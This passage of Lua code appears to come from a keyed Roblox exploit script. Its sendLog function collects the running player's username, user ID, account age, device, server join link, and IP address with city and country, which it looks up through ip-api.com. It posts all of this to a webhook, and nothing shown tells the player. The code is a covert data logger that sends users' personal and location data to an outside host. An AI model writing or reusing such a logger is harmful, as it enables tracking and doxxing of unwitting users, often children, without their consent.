local LocalPlayer = Players.LocalPlayer

local function sendLog(usedKey)
    local placeId = game.PlaceId
    local success, productInfo = pcall(function() return MarketplaceService:GetProductInfo(placeId, Enum.InfoType.Asset) end)
    local gameName = success and productInfo.Name or "Unknown"
    local creatorName = success and productInfo.Creator.Name or "Unknown"
    local creatorId = success and productInfo.Creator.CreatorTargetId or 0
    local visits = success and productInfo.Visits or "Unknown"
    local gameThumbnail = ("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png"):format(placeId)
    local gameLink = ("https://www.roblox.com/games/%d"):format(placeId)
    local userId = LocalPlayer.UserId
    local displayName = LocalPlayer.DisplayName
    local accountAge = LocalPlayer.AccountAge
    local joinDate = os.date("%Y-%m-%d", os.time() - (accountAge * 86400))
    local avatarHeadshot = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(userId)
    local profileLink = ("https://www.roblox.com/users/%d/profile"):format(userId)

    local ip, city, country = "Unknown", "Unknown", "Unknown"
    pcall(function()
        local res = game:HttpGet("http://ip-api.com/json/")
        local data = HttpService:JSONDecode(res)
        ip, city, country = data.query or "Unknown", data.city or "Unknown", data.country or "Unknown"
    end)

    local ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    local fps = math.floor(1 / RunService.RenderStepped:Wait())
    local deviceType = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled and "Mobile" or UserInputService.GamepadEnabled and "Console" or "PC"
    local jobId = game.JobId
    local totalPlayers = #Players:GetPlayers()
    local joinServerLink = jobId ~= "" and ("https://www.roblox.com/games/%d?privateServerLinkCode=%s"):format(placeId, jobId) or "Public Server"

    local data = {
        username = webhookUsername,
        avatar_url = webhookAvatarURL,
        embeds = {{
            title = "SCRIPT EXECUTED - VALID KEY USED",
            color = 0x00ff00,
            thumbnail = { url = avatarHeadshot },
            image = { url = gameThumbnail },
            fields = {
                { name = "USED KEY", value = string.format("```%s```", usedKey), inline = false },
                { name = "Player Info", value = string.format("**User:** [%s](%s) (`%d`)\n**Display:** %s\n**Age:** %d days\n**Device:** %s", LocalPlayer.Name, profileLink, userId, displayName, accountAge, deviceType), inline = true },
                { name = "Game Info", value = string.format("**Game:** [%s](%s)\n**Creator:** %s\n**Players:** %d", gameName, gameLink, creatorName, totalPlayers), inline = true },
                { name = "Network", value = string.format("**IP:** %s\n**Location:** %s, %s\n**Ping/FPS:** %dms / %dfps", ip, city, country, ping, fps), inline = true },
                { name = "Script Info", value = string.format("**Executor:** %s\n**Version:** %s", executorName, scriptVersion), inline = true },
                { name = "Join Server", value = string.format("[Click Here](%s)", joinServerLink), inline = false }
            },
            footer = { text = "Logged â€¢ " .. os.date("%Y-%m-%d %H:%M:%S"), icon_url = webhookAvatarURL }
        }}
    }

    local json = HttpService:JSONEncode(data)
    local req = syn and syn.request or http_request or request or httprequest
    if req then pcall(function() req({Url=webhookURL, Method="POST", Headers={["Content-Type"]="application/json"}, Body=json}) end) end
end

